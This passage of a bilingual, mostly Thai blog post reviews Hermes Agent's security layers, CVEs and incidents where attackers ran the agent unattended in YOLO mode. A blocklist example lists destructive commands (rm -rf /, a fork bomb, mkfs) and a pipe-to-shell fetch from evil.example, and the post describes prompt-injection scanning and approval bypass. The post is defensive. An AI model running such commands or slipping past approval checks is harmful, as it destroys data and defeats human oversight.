+    <p><code>--cap-drop ALL</code> ตามด้วย <code>--cap-add</code> เฉพาะสามตัวคือท่ามาตรฐาน least-privilege ที่ถูกต้อง ส่วน <code>--pids-limit 256</code> กับ tmpfs แบบ <code>noexec</code> เป็นรายละเอียดที่บอกว่าคนออกแบบเคยเจอ fork bomb และ payload ที่แอบวางไว้ใน /tmp มาแล้วจริง ๆ สำหรับองค์กร ผมถือว่า <code>terminal.backend: docker</code> คือเส้นต่ำสุดที่ยอมรับได้ — local backend ควรจบชีวิตอยู่แค่บน laptop ทดลองส่วนตัว</p>
+
+    <h2 id="th-approvals">Approvals, YOLO Mode และ Hardline Blocklist</h2>
+
+    <p>ชั้นถัดมาคือระบบขออนุมัติคำสั่ง ค่า default ของ <code>approvals.mode</code> คือ <strong>smart</strong> — ใช้ LLM ตัวช่วยอีกตัวประเมินความเสี่ยงของแต่ละคำสั่ง: ความเสี่ยงต่ำผ่านอัตโนมัติ ไม่แน่ใจจึงส่งมาถามมนุษย์ อีกสองโหมดคือ <code>manual</code> (ถามทุกคำสั่ง) และ <code>off</code> ที่น่าชื่นชมคือ context แบบไม่มีคนนั่งเฝ้า — cron, one-shot query, unattended — ค่า default เป็น <strong>deny</strong> ทั้งหมด และถ้าไม่มีใครตอบภายใน 300 วินาที คำสั่งก็ถูกปฏิเสธ:</p>
+
+    <pre><code># ~/.hermes/config.yaml
+approvals:
+  mode: smart              # smart | manual | off
+  cron_mode: deny          # งาน cron ไม่มีคนเฝ้า → ปฏิเสธ
+  single_query_mode: deny  # one-shot query → ปฏิเสธ
+  unattended_mode: deny    # session ไร้คนคุม → ปฏิเสธ
+  timeout: 300             # วินาที — เงียบเกินนี้ = ปฏิเสธ
+  deny:                    # กติกา fnmatch ของเราเอง — รอดแม้ใน YOLO
+    - "aws iam *"
+    - "kubectl delete *"
+    - "* --force"</code></pre>
+
+    <p>แล้วก็มาถึงสวิตช์ที่ทั้งซีรีส์นี้จะพูดถึงซ้ำ ๆ: <strong>YOLO mode</strong> เปิดได้สามทาง — flag <code>--yolo</code>, slash command <code>/yolo</code> หรือ env <code>HERMES_YOLO_MODE=1</code> — และมันข้ามระบบ approvals ทั้งหมด สิ่งที่มัน<em>ข้ามไม่ได้</em>มีสองอย่าง: กติกา <code>approvals.deny</code> ที่ผู้ใช้เขียนเอง กับ <strong>hardline blocklist</strong> ที่ฝังตายตัวในโค้ด:</p>
+
+    <pre><code># ตัวอย่างคำสั่งที่ hardline blocklist ปฏิเสธเสมอ — แม้เปิด YOLO
+rm -rf /                          # ลบ root แบบ recursive
+:(){ :|:&amp; };:                     # fork bomb
+mkfs.ext4 /dev/sda1               # format device ที่ mount อยู่
+curl http://evil.example/a.sh | sh  # pipe URL แปลกหน้าลง shell</code></pre>
+
+    <div class="alert danger">
+        <strong>คำเตือนที่ต้องพูดตรงนี้เลย:</strong> YOLO mode ออกแบบมาสำหรับ sandbox ที่พังแล้วทิ้งได้เท่านั้น อย่าเปิดบนเครื่องที่มี credentials จริงเด็ดขาด — หัวข้อเหตุการณ์จริงด้านล่างจะเล่าว่าเกิดอะไรขึ้นเมื่อมีคนเปิดมันทิ้งไว้ในเครือข่ายของหน่วยงานรัฐไทย
+    </div>
+
+    <p>มุมมองของผมต่อชั้นนี้: smart approvals เป็น UX ที่ดีมากสำหรับงานประจำวัน แต่อย่าลืมว่าตัวประเมินความเสี่ยงก็คือ LLM อีกตัว ซึ่งโดยนิยามแล้วหลอกได้เหมือนกัน มันคือ damage reduction ชั้นดี — ไม่ใช่ boundary ตามที่ SECURITY.md เตือนไว้เอง</p>
+
+    <h2 id="th-secrets">Secrets และ File-Write Guards — และขีดจำกัดที่เอกสารยอมรับเอง</h2>
+
+    <p>Hermes บล็อกการเขียนไฟล์ผ่านเครื่องมือ <code>write_file</code>/<code>patch</code> ไปยังที่เก็บ credentials แบบ hard-block — ทั้งของระบบปฏิบัติการและของตัว Hermes เอง:</p>
+
+    <pre><code># เส้นทางที่ file-write guard ปฏิเสธเสมอ
+~/.ssh/          ~/.aws/          ~/.kube/
+/etc/sudoers     ~/.netrc
+~/.hermes/auth.json               # credentials ของ Hermes เอง
+.env และ .env.*                   # ทุกที่ในโปรเจกต์
+mcp-tokens/      pairing/
+
+# จำกัดขอบเขตการเขียนเพิ่มได้อีกชั้น
+export HERMES_WRITE_SAFE_ROOT="/home/anirach/projects"</code></pre>
+
+    <p>แต่บรรทัดที่มีค่าที่สุดของหน้า <a href="https://hermes-agent.nousresearch.com/docs/user-guide/security/">security docs</a> คือคำสารภาพที่ตามมา: เอกสารบอกเองว่า terminal tool ยังเลี่ยง guard พวกนี้ได้ — &laquo;file guards มีไว้ลดความเสียหายจากอุบัติเหตุและส่งสัญญาณให้โมเดล ไม่ใช่ sandbox สำหรับ agent ที่เป็นปฏิปักษ์&raquo; พูดง่าย ๆ คือ <code>echo x &gt;&gt; ~/.ssh/config</code> ผ่าน shell ยังทำได้ ถ้า shell นั้นวิ่งบน host — วนกลับมาที่ premise เดิม: อยากได้กำแพงจริง ต้องใช้ container</p>
+
+    <p>ฝั่ง secrets มีสามกลไกที่ทำงานเงียบ ๆ ตลอดเวลา:</p>
+
+    <ul>
+        <li><strong>Env filtering</strong> — ตัวแปรสภาพแวดล้อมที่ชื่อเข้า pattern KEY / TOKEN / SECRET / PASSWORD / CREDENTIAL / PASSWD / AUTH ถูกตัดออกจาก child process ทุกตัวโดย default</li>
+        <li><strong>MCP minimal env</strong> — subprocess ของ MCP แบบ stdio ได้ env แบบ allowlist เท่านั้น: PATH, HOME, USER, LANG, LC_ALL, TERM, SHELL, TMPDIR และตระกูล XDG_*</li>
+        <li><strong>Redaction</strong> — ข้อความ error ถูกกรอง GitHub PAT (<code>ghp_...</code>), key แบบ <code>sk-...</code>, bearer token และพารามิเตอร์ key=/password= ให้กลายเป็น <code>[REDACTED]</code></li>
+    </ul>
+
+    <p>ถ้า skill ตัวไหนต้องใช้ secret จริง ๆ ก็ประกาศขอแบบเจาะจงได้ แทนที่จะเปิด env ทั้งกระดาน:</p>
+
+    <pre><code># ใน manifest ของ skill — ขอ passthrough เฉพาะตัวที่จำเป็น
+required_environment_variables:
+  - GITHUB_TOKEN</code></pre>
+
+    <p>เรื่องนี้ยังมีความเคลื่อนไหวถึงปัจจุบัน: release <a href="https://github.com/NousResearch/hermes-agent/releases">v0.21.0 (31 สิงหาคม 2026)</a> ระบุ &laquo;deep redaction sweep&raquo; ที่ไล่ปิดช่องรั่วของ secret ใน terminal errors, การอ่านไฟล์ env, checkpoints และ log — พร้อมบังคับ write-approval กับไฟล์ instruction ของ agent ที่ถูกป้องกัน ซึ่งบอกเราสองอย่าง: ทีมยังลงทุนกับชั้นนี้ต่อเนื่อง และช่องรั่วแบบนี้เคยมีอยู่จริงจนต้อง sweep</p>
+
+    <h2 id="th-injection">Prompt Injection, Tirith และ SSRF Defense</h2>
+
+    <p>ชั้นที่สามรับมือกับอินพุตปนเปื้อน — ภัยที่ผมถือว่าอันตรายที่สุดสำหรับ agent ที่อ่านเว็บและไฟล์ได้เอง Hermes สแกน context files (AGENTS.md, .cursorrules, SOUL.md) <em>ก่อน</em>เอาเข้า prompt ทุกครั้ง: หา override instructions, HTML comment ที่ซ่อนคำสั่ง, ความพยายามอ่าน credential, ท่า exfiltration ผ่าน curl และ<strong>อักขระ Unicode ล่องหน</strong> (zero-width, bidi override — ท่าโปรดของการซ่อน payload ในไฟล์ที่มนุษย์มองไม่เห็นอะไรผิดปกติ) เนื้อหาที่โดนจับได้ถูกแทนด้วย marker <code>[BLOCKED: ...]</code> เพื่อให้เห็นในภายหลังว่าเคยมีอะไรถูกกรองไป</p>
+
+    <p>ก่อนรันคำสั่ง ยังมี <strong>Tirith</strong> — pre-exec scanner ที่เปิดโดย default (<code>security.tirith_enabled: true</code>) ตรวจ homograph URL, ท่า pipe-to-interpreter และ terminal injection ตัว scanner ถูกติดตั้งอัตโนมัติพร้อมตรวจ SHA-256 มี timeout 5 วินาที และทำงานแบบ <strong>fail-open</strong> — ถ้า scanner ล่ม คำสั่งก็วิ่งต่อ ส่วนแนวป้องกัน <strong>SSRF</strong> เป็นขั้วตรงข้าม: เปิดตลอดและ <strong>fail-closed</strong> สำหรับทุกเครื่องมือที่แตะ URL — บล็อก RFC-1918, loopback, link-local (รวม <code>169.254.169.254</code> ที่เป็นประตูขโมย cloud credentials คลาสสิก), CGNAT 100.64.0.0/10 และ hostname ของ metadata service พร้อมตรวจ redirect ซ้ำทุก hop</p>
+
+    <div class="alert info">
+        <strong>คู่คำที่ควรจำจากหัวข้อนี้:</strong> fail-open = พังแล้วปล่อยผ่าน (Tirith — เลือกความลื่นไหล) / fail-closed = พังแล้วปิดประตู (SSRF, dashboard — เลือกความปลอดภัย) เวลาอ่านเอกสาร security ของเครื่องมือใด ๆ ให้หาสองคำนี้ก่อนเสมอ เพราะมันบอกว่าเมื่อระบบล้ม ความเสี่ยงตกอยู่กับใคร
+    </div>
+
+    <pre><code># ~/.hermes/config.yaml
+security:
+  tirith_enabled: true        # default — fail-open, timeout 5s
+  allow_private_urls: false   # default — SSRF guard แบบ fail-closed
+  website_blocklist:          # บล็อกเพิ่มเองได้ ใช้ร่วมกับ web/browser tools
+    - "*.pastebin.com"</code></pre>
+
+    <p>แต่หัวข้อนี้ต้องปิดด้วยความย้อนแย้งหนึ่งข้อ: NVD ยืนยัน CVE-2026-10223 (Medium, CVSS 6.3): ตัวสแกนเนื้อหา memory ของ Hermes เอง (<code>_scan_memory_content</code>) เป็นช่องทาง injection ในรุ่น 2026.4.0–2026.4.30 และมี exploit เผยแพร่สาธารณะแล้ว (SentinelOne จัดประเภทแรงกว่านั้นเป็น RCE) — <strong>ตัว scanner ก็คือ attack surface เพิ่มอีกชิ้น</strong> ทุกชั้นที่เพิ่มเข้ามาคือโค้ดที่พังได้เพิ่มขึ้น นี่ไม่ใช่เหตุผลให้ถอด scanner ทิ้ง แต่เป็นเหตุผลที่ดีอีกข้อว่าทำไมชั้นพวกนี้ถึงนับเป็น boundary ไม่ได้</p>
+
+    <hr>
+
+    <h2 id="th-channels">ใครเข้ามาคุยได้บ้าง: Default-Deny และ DM Pairing</h2>
+
+    <p>บทเรียนที่เจ็บที่สุดจากยุค OpenClaw คือ gateway ที่ &laquo;ใครทักก็คุย&raquo; Hermes ตอบด้วยระบบ authorization แบบ <strong>default-deny</strong> ที่ไล่ตัดสินตามลำดับหกขั้น — ถ้าไม่เข้าเงื่อนไขข้อไหนเลย คำตอบคือปฏิเสธ:</p>
+
+    <ol>
+        <li>Flag allow-all ระดับ platform (ถ้าตั้งใจเปิดเอง)</li>
+        <li>รายชื่อที่อนุมัติผ่าน <strong>DM pairing</strong> แล้ว</li>
+        <li>Allowlist ราย platform เช่น <code>TELEGRAM_ALLOWED_USERS</code></li>
+        <li><code>GATEWAY_ALLOWED_USERS</code> ระดับ global</li>
+        <li><code>GATEWAY_ALLOW_ALL_USERS</code> (สวิตช์ที่ checklist ทางการบอกว่าอย่าเปิดใน production)</li>
+        <li>ไม่เข้าข้อไหนเลย → <strong>deny</strong></li>
+    </ol>
+
+    <p>ตัว DM pairing ออกแบบอย่างคนเคยโดน brute force มาก่อน: โค้ด 8 ตัวอักษรสุ่มแบบ cryptographic, อายุ 1 ชั่วโมง, ค้างได้สูงสุด 3 รายการต่อ platform, ขอได้ 1 ครั้งต่อผู้ใช้ต่อ 10 นาที, เดาผิด 5 ครั้งโดนล็อก 1 ชั่วโมง และไฟล์เก็บสถานะ pairing ถูก chmod 0600:</p>
+
+    <pre><code># จัดการ pairing จาก CLI
+hermes pairing list                # ดูคำขอค้างและรายชื่อที่อนุมัติแล้ว
+hermes pairing approve &lt;code&gt;      # อนุมัติด้วยโค้ด 8 ตัวที่ผู้ใช้ส่งมา
+hermes pairing revoke &lt;user&gt;       # ถอนสิทธิ์เมื่อคนออกจากทีม</code></pre>
+
+    <p>ฝั่ง <strong>web dashboard</strong> ก็ถูกออกแบบใหม่ตามปรัชญาเดียวกัน — ค่า default ผูกกับ <code>127.0.0.1:9119</code> เท่านั้น และถ้าพยายาม bind ออก interface สาธารณะโดยไม่ตั้ง auth provider มันจะ<strong>ปฏิเสธที่จะสตาร์ท</strong> (fail-closed) ตัวเลือก auth มีสามทาง: username/password แบบ scrypt-hashed, OAuth ผ่าน Nous Portal (ทางที่เอกสารแนะนำถ้าต้องออกอินเทอร์เน็ต) หรือ OIDC ที่ self-host เอง เช่น Keycloak/Authentik เสริมด้วย access token อายุ 15 นาที, rate limit 10 ครั้ง/นาที/IP, audit log ของ auth event และ <code>dashboard.trusted_proxies</code> คู่กับ <code>HERMES_DASHBOARD_PUBLIC_URL</code> สำหรับกัน DNS rebinding เมื่ออยู่หลัง reverse proxy — ชุดนี้เข้ามาแทนที่คำวิจารณ์ยุคแรกที่ว่า dashboard ไม่มี auth ซึ่งวันนี้ไม่จริงแล้ว</p>
+
+    <pre><code># ~/.hermes/config.yaml — โครงฝั่ง dashboard
+dashboard:
+  # default bind: 127.0.0.1:9119 — loopback เท่านั้น
+  # bind ออก non-loopback ได้ก็ต่อเมื่อตั้ง auth provider แล้ว (fail-closed)
+  trusted_proxies:
+    - 10.0.0.5              # reverse proxy ที่เชื่อถือ
+# ตั้งคู่กับ HERMES_DASHBOARD_PUBLIC_URL เมื่ออยู่หลัง proxy</code></pre>
+
+    <h2 id="th-cves">บันทึก CVE: หกเดือนแรกพังอะไรไปบ้าง</h2>
+
+    <p>ช่วงต้นปีมีบทเปรียบเทียบจำนวนมากชู Hermes ว่า &laquo;ยังไม่มี CVE เลย&raquo; เทียบกับสถิติอันอื้อฉาวของ OpenClaw ผมจะไม่พิมพ์ตัวเลขฝั่ง OpenClaw ซ้ำตรงนี้ เพราะแหล่งข้อมูลบุคคลที่สามขัดแย้งกันเองหลายเท่าตัว (ผมเคยชำระตัวเลขชุดนั้นไว้แล้วในโพสต์ OpenClaw Security) — แต่ประเด็นสำคัญกว่าคือ กรอบคิด &laquo;zero CVE&raquo; นั้นตายไปตั้งแต่ฤดูร้อน: ความจริงมันสะท้อนแค่ว่ายังไม่มีใครมอง พอ Hermes โตถึงระดับแสนดาว นักวิจัยก็มาถึง และ CVE ก็ตามมา ส่วนใหญ่ยื่นกับ build ช่วงเมษายน 2026:</p>
+
+    <div class="table-wrapper">
+        <table>
+            <thead>
+                <tr>
+                    <th>CVE</th>
+                    <th>ประเภท</th>
+                    <th>เวอร์ชันที่กระทบ</th>
+                    <th>สถานะ</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td><strong>CVE-2026-53869</strong></td>
+                    <td>DNS rebinding บน WebSocket endpoints — CVSS 8.7 (High)</td>
+                    <td>ต่ำกว่า 0.16.0</td>
+                    <td>แก้ใน 0.16.0 — เผยแพร่ 17 มิ.ย. 2026</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-11461</strong></td>
+                    <td>Authorization bypass ข้าม session ผ่าน resolve_session_by_title</td>
+                    <td>ถึง 0.12.0</td>
+                    <td>แก้แล้ว (ข้อมูล SentinelOne)</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-9368</strong></td>
+                    <td>ปัญหา sandbox ของ execute_code</td>
+                    <td>build ถึง 2026.4.16</td>
+                    <td>แก้แล้ว</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-10548</strong></td>
+                    <td>การจัดการ credential ใน credential_pool</td>
+                    <td>build ถึง 2026.4.23</td>
+                    <td>แก้แล้ว</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-53870</strong></td>
+                    <td>ไฟล์สถานะถูกสร้างแบบ world-readable (0o644)</td>
+                    <td>build เมษายน 2026</td>
+                    <td>แก้แล้ว</td>
+                </tr>
+                <tr>
+                    <td><strong>CVE-2026-10223</strong></td>
+                    <td>Injection/RCE ในตัวสแกน memory เอง (รายงานโดย SentinelOne)</td>
+                    <td>build ถึง 2026.4.30</td>
+                    <td>แก้แล้ว</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <p>ตัวที่ควรอ่านรายละเอียดคือ <strong>CVE-2026-53869</strong>: WebSocket endpoints (<code>/api/pty</code>, <code>/api/ws</code>, <code>/api/pub</code>, <code>/api/events</code>) โดน DNS rebinding ได้ เพราะ HTTP middleware ของ FastAPI <em>ไม่ทำงานกับ WebSocket upgrade</em> — การตรวจ Host/Origin ที่ป้องกันเส้นทาง HTTP ปกติจึงถูกข้ามหมด เว็บเพจร้าย ๆ ในเบราว์เซอร์ของคุณสามารถหมุน DNS มาชี้ localhost แล้วต่อเข้า pty ของ agent ได้ตรง ๆ นี่คือ class บั๊กเดียวกับที่เล่นงาน dev tools มานับไม่ถ้วน: ชั้นป้องกันมีอยู่จริง แต่ไม่ครอบทุกประตู</p>
+
+    <p>ภาพรวมจำนวน: คลัง CVE ของ Kodem Security รวบรวม hermes-agent ไว้ราวสิบรายการ ณ ต้นกันยายน 2026 (นับแน่นอนควรไปไล่จาก NVD เอง เพราะรายการของ aggregator มีตกหล่น) ส่วน Cloud Security Alliance ออก research note เมื่อ 4 พฤษภาคม 2026 ในชื่อจงใจจี้ใจ — &laquo;9 CVEs in 4 Days: What Hermes Agent Enterprises Must Learn&raquo; — เนื้อในระบุ CVE ที่เปิดเผยเป็นทางการ 3 รายการ บวก finding ระดับ critical/high อีก 13 ข้อจากการ audit เดือนเมษายน (เลข 9 ในชื่อรวม batch ที่จองไว้ภายหลัง) ข้อสรุปของ CSA ตรงกับใจผม: ความเสี่ยงตัวจริงเป็น<strong>เชิงสถาปัตยกรรม</strong> — memory ถาวร + เครื่องมือกว้าง + credential เข้มข้น คือ attack surface class เดียวกับ OpenClaw ไม่ว่าโค้ดจะสะอาดแค่ไหน</p>
+
+    <div class="alert">
+        <strong>ช่องว่างที่ยังเปิดอยู่ ณ วันเขียน (1 ก.ย. 2026):</strong> <a href="https://github.com/NousResearch/hermes-agent/issues/4281">GitHub issue #4281</a> (เปิดตั้งแต่ 31 มี.ค. 2026, ระดับ P2, ยังไม่มีคำตอบจาก maintainer) ชี้ว่า session ที่มาจาก messaging gateway เมื่อใช้ <code>terminal.backend: local</code> จะรันคำสั่งบน host ด้วยสิทธิ์ user เต็ม ๆ และเครื่องมือ <code>execute_code</code> ข้ามระบบ approval ไปเลยทั้งดุ้น — นี่คือเหตุผลข้อใหญ่ที่สุดที่ผมย้ำว่า production ต้องเป็น docker backend เท่านั้น
+    </div>
+
+    <h2 id="th-incidents">เหตุการณ์จริง: เมื่อ YOLO กลายเป็นฟีเจอร์ของผู้โจมตี</h2>
+
+    <p>สิ่งที่น่าสนใจในบันทึกเหตุการณ์จริงของ Hermes คือ ทั้งหมดเป็นเรื่อง<strong>การใช้งานผิดและตั้งค่าผิด</strong> ไม่ใช่การเจาะตัว Hermes เอง — และเหตุการณ์แรกเกิดในบ้านเราเอง</p>
+
+    <p>ตามรายงานของ The Hacker News (กรกฎาคม 2026) นักวิจัยจาก Hunt.io ร่วมกับ Bob Diachenko พบว่ามีผู้ไม่หวังดีรัน Hermes แบบ<strong>ไม่มีคนเฝ้า ในโหมด YOLO</strong> เป็น post-exploitation agent อยู่ภายในเครือข่าย<strong>กระทรวงการคลังของไทย</strong> — ใช้มันรัน LinPEAS ลาดตระเวนสิทธิ์, ไล่อ่านระเบียนบุคลากรย้อนถึงปี 2012 และสำรวจ Hadoop cluster ที่เปิด auth แบบ default ไว้ ที่ย้อนแย้งจนเกือบขำคือวิธีที่เรื่องแดง: ผู้ก่อเหตุเปิด directory <code>/hermes-results/</code> ของตัวเองทิ้งไว้บนอินเทอร์เน็ต นักวิจัยเลยอ่าน log การทำงานของ agent ได้ทั้งหมด ThaiCERT ได้รับแจ้งเมื่อ 15 กรกฎาคม 2026 รายงานระบุชัดว่าไม่พบหลักฐานการ exfiltrate ข้อมูลออก และย้ำชัดว่านี่<strong>ไม่ใช่ช่องโหว่ของ Hermes</strong> — เป็นเครื่องมือถูกกฎหมายที่ถูกประกอบเป็นอาวุธด้วยสวิตช์ที่มันแถมมาให้</p>
+
+    <p>ในฐานะอาจารย์ไทยที่รัน agent deployment อยู่ทุกวัน เหตุการณ์นี้กระทบใจผมสองชั้น ชั้นแรกคือมันเกิดกับหน่วยงานรัฐของเราเอง ชั้นที่สองลึกกว่า: ทุก property ที่ทำให้ Hermes เป็นผู้ช่วยที่ดี — ทำงานต่อเนื่องไม่ต้องคุม, ใช้เครื่องมือได้กว้าง, ตัดสินใจเองได้ — คือ property ชุดเดียวกับที่ผู้โจมตีต้องการเป๊ะ ๆ <strong>YOLO mode ที่เราเปิดเพื่อความสะดวก คือฟีเจอร์ automation ของฝั่งโจมตีโดยไม่ต้องดัดแปลงอะไรเลย</strong></p>
+
+    <p>สองสัปดาห์ถัดมา Palo Alto Networks Unit42 (31 กรกฎาคม 2026) บันทึกเคสที่เป็นระบบกว่า: ผู้ก่อเหตุประกอบ DeepSeek เป็นสมองให้เหตุผล และใช้ Hermes เป็น harness ปฏิบัติการ — สแกนและโจมตีเซิร์ฟเวอร์สาธารณะทั้ง Citrix NetScaler, Langflow และ n8n แบบวนรอบอัตโนมัติโดยไม่ต้องอนุมัติรายคำสั่ง พร้อมยืนยันว่ามีการขโมยข้อมูลเกิดขึ้นจริง และภาพพื้นหลังก็ไม่เงียบ: ข้อมูลฝั่ง Hunt.io ที่ Penligent รายงานระบุ probe ตามหา server header ของ HermesWebUI ราว 5,900 ครั้งในรอบเดือน และพบ directory <code>/hermes-results/</code> เปิดโล่ง 575 แห่ง ณ 23 กรกฎาคม 2026 — แปลว่ามีคนสแกนหา Hermes ที่ตั้งค่าผิดอยู่ตลอดเวลา จนถึงวันที่เขียน ผมยังไม่พบแถลงการณ์ตอบเหตุการณ์เหล่านี้จาก Nous Research โดยตรง</p>
+
+    <h2 id="th-checklist">Hardening Checklist สำหรับองค์กร — และช่องว่างที่ยังเหลือ</h2>
+
+    <p>เอกสารทางการปิดท้ายด้วย checklist สำหรับ production ราวสิบข้อ ซึ่งผมขอเรียงใหม่ตามลำดับที่ควรทำจริง:</p>
+
+    <ol>
+        <li>ใช้ allowlist ระบุตัวคนชัดเจน — <strong>ห้ามตั้ง</strong> <code>GATEWAY_ALLOW_ALL_USERS=true</code> เด็ดขาด</li>
+        <li><code>terminal.backend: docker</code> พร้อม resource limits — ข้อนี้คือหัวใจของทั้งบทความ</li>
+        <li>เก็บ secrets ใน <code>~/.hermes/.env</code> และ <code>chmod 600</code></li>
+        <li>ใช้ DM pairing แทนการ hardcode ID ผู้ใช้</li>
+        <li>รัน Hermes ด้วย user ธรรมดา ไม่ใช่ root</li>
+        <li>ตรวจ <code>command_allowlist</code> ซ้ำเป็นระยะ</li>
+        <li>เฝ้าดู <code>~/.hermes/logs/</code> สม่ำเสมอ</li>
+        <li>อัปเดตตามรุ่นล่าสุดเสมอ — CVE ทั้งตารางข้างบนแก้ไปแล้วในรุ่นใหม่</li>
+        <li>ขั้นสูงสุด: แยกเครื่อง — gateway อยู่เครื่องหนึ่ง แล้วชี้ <code>terminal.backend: ssh</code> ไปยังเครื่อง execution ต่างหาก ให้ messaging กับ execution ไม่อยู่บน host เดียวกัน</li>
+    </ol>
+
+    <pre><code># config.yaml ฝั่ง production ที่ผมใช้เป็นจุดตั้งต้น
+terminal:
+  backend: docker
+  container_cpu: 1
+  container_memory: 5120
+approvals:
+  mode: smart
+  unattended_mode: deny
+  deny:
+    - "aws iam *"
+    - "* --force"
+security:
+  tirith_enabled: true
+  allow_private_urls: false</code></pre>
+
+    <pre><code># งานประจำสัปดาห์ของ admin
+hermes doctor                      # เช็ค advisory ห่วงโซ่อุปทาน — เคยจับ
+                                   # เคสวางยา mistralai 2.4.6 (พ.ค. 2026) ตอนสตาร์ท
+hermes skills audit                # ไล่ตรวจ skills ที่ติดตั้งแล้ว
+tail -f ~/.hermes/logs/gateway.log # ดู log — ข้อ 7 ของ checklist</code></pre>
+
+    <p>ฝั่ง supply chain ของ skills ก็มีเกราะที่ตอบบทเรียน marketplace ยุคก่อนตรง ๆ: ทุก skill จากบุคคลที่สามถูกบังคับสแกนตอนติดตั้ง (หา exfiltration, คำสั่ง injection, คำสั่งทำลายล้าง) มี trust tiers ไล่จาก builtin/official ลงมาถึง community และคำตัดสินระดับ &laquo;dangerous&raquo; นั้น<strong>ไม่มีทาง override ได้</strong>แม้จะใส่ <code>--force</code> ส่วน skill ที่ agent เขียนเองระหว่าง session ก็ผ่านประตู <code>skills.write_approval</code> ให้มนุษย์รีวิว diff ก่อนทุกครั้ง (v0.21.0 เพิ่มการสแกนตอนติดตั้ง plugin เข้ามาอีกชั้น) — รายละเอียดชุดนี้ผมจะลงลึกในโพสต์ #6 Skills</p>
+
+    <p>แล้วอะไรที่ Hermes ยัง<em>ไม่มี</em>? บทวิเคราะห์ enterprise ของ LensHQ (13 สิงหาคม 2026) ไล่ช่องว่างไว้ชัด: ไม่มี SSO/RBAC ในตัว, ไม่มี audit trail รวมศูนย์แบบแก้ไขไม่ได้, ไม่มี default-deny egress และไม่มีกลไกหมุนเวียน credential — ข้อแนะนำของเขาคือใช้ microVM isolation แทน container ที่ share kernel และบังคับ egress ทั้งหมดผ่าน proxy allowlist เพื่อให้การ exfiltrate จาก prompt injection <em>ล้มเหลวและถูกบันทึก</em>พร้อมกัน ผมเห็นด้วยเกือบทั้งหมด แต่ต้องเติมความเป็นธรรมหนึ่งข้อ: คำวิจารณ์นี้แม่นสำหรับตัว OSS ที่ self-host — ส่วน Nous เองเริ่มขายฝั่งองค์กรผ่าน <strong>Hermes Cloud</strong> (public preview ราวกรกฎาคม 2026) ที่โฆษณา granular access controls และ unified billing ผ่าน Nous Portal ซึ่งเป็นคนละเส้นทางกับการ self-host และผมจะชวนดูใน #7 Production</p>
+
+    <blockquote>💡 Repello AI สรุป threat model ของ agent ถาวรไว้ในประโยคที่ผมยกให้เป็นบทสรุปของทั้งเรื่อง: &laquo;you cannot patch your way to a secure persistent agent&raquo; — ช่องโหว่แก้ได้ทีละตัว แต่สถาปัตยกรรมของความเสี่ยงยังอยู่ครบ ตราบใดที่ agent จำได้ ทำได้ และถือกุญแจ</blockquote>
+
+    <p>ข้อสรุปของผมสำหรับองค์กรไทยที่กำลังพิจารณา Hermes: ชั้นป้องกันที่มันแถมมาดีกว่ามาตรฐานของวงการ ณ วันนี้จริง และดีขึ้นต่อเนื่องทุกรุ่น — แต่จงเชื่อประโยคแรกของ SECURITY.md มากกว่าฟีเจอร์ทุกตัวรวมกัน: วางแผนโดยสมมติว่า approvals กับ scanner จะพลาด แล้วให้ container, เครือข่ายที่แยกส่วน และ egress proxy เป็นคนรับหน้าที่เมื่อวันนั้นมาถึง</p>
+
+    <div class="key-takeaways">
+        <h3>🎯 สิ่งสำคัญที่ต้องจำ</h3>
+        <ul>
+            <li><strong>OS-level isolation</strong> = แนวป้องกันเดียวที่ SECURITY.md ยอมรับว่า &laquo;จริง&raquo; — approvals/denylist/scanner ทุกตัวเป็น damage reduction</li>
+            <li><strong>terminal.backend: docker</strong> = เส้นต่ำสุดสำหรับ production — ค่า default แข็งอยู่แล้ว (cap-drop ALL, no-new-privileges, pids-limit 256, tmpfs noexec)</li>
+            <li><strong>YOLO mode</strong> = ข้าม approvals ทั้งหมดเหลือแค่ hardline blocklist — และถูกใช้เป็นเครื่องมือโจมตีจริงแล้วในเหตุการณ์กระทรวงการคลังไทย</li>
+            <li><strong>File-write guards</strong> = กันอุบัติเหตุ ไม่ใช่กัน agent ที่เป็นปฏิปักษ์ — เอกสารสารภาพเองว่า terminal เลี่ยงได้</li>
+            <li><strong>Fail-open vs fail-closed</strong> = Tirith ล่มแล้วปล่อยผ่าน แต่ SSRF และ dashboard ล่มแล้วปิดประตู — อ่านเอกสาร security ให้หาสองคำนี้ก่อน</li>
+            <li><strong>Default-deny + DM pairing</strong> = คำตอบตรง ๆ ต่อบทเรียน gateway เปิดโล่งยุค OpenClaw</li>
+            <li><strong>บันทึก CVE</strong> = กรอบ &laquo;zero CVE&raquo; ตายแล้ว — DNS rebinding CVSS 8.7 แก้ใน 0.16.0 และ issue #4281 (execute_code ข้าม approvals บน local backend) ยังเปิดอยู่</li>
+            <li><strong>Checklist องค์กร</strong> = allowlist ชัดเจน, docker backend, chmod 600, non-root, แยกเครื่อง gateway/execution — และเติม egress proxy เองเพราะ Hermes ยังไม่มี default-deny egress</li>
+        </ul>
+    </div>
+
+    </div>
+    <div class="l-en" lang="en">
+
+    <p>Before you read this post, ask yourself one question: if the AI agent you have authorized to run commands on a real machine is one day turned against you by <strong>prompt injection</strong> — what is the last thing that can actually stop it? An approval dialog? A denylist? A scanner? Or nothing at all?</p>
+
+    <p>Readers of my OpenClaw for Organizations series will remember I worked through this question in <a href="/blog/openclaw-security">OpenClaw Security</a> — back when exposed gateways and poisoned marketplace skills were weekly news. Hermes Agent, from Nous Research, publicly launched on February 25, 2026, after watching all of those wounds happen, and it was designed against nearly every one of them: channels are default-deny, DMs require pairing codes, the dashboard fails closed, and every third-party skill is scanned before installation.</p>
+
+    <p>Yet the thing I respect most in the Hermes documentation is none of those features. It is a single sentence in SECURITY.md that admits, in plain language, that every layer I just listed is merely damage reduction — and that only one boundary is real. This post walks through each layer in detail, then holds the design up against what actually happened in the first six months, including the incident that hits closest to home for those of us in Thailand: a Hermes instance in YOLO mode running unattended inside the network of Thailand's Ministry of Finance.</p>
+
+    <h2 id="en-premise">The Most Honest Line in Agent Security: OS-Level Isolation or Nothing</h2>
+
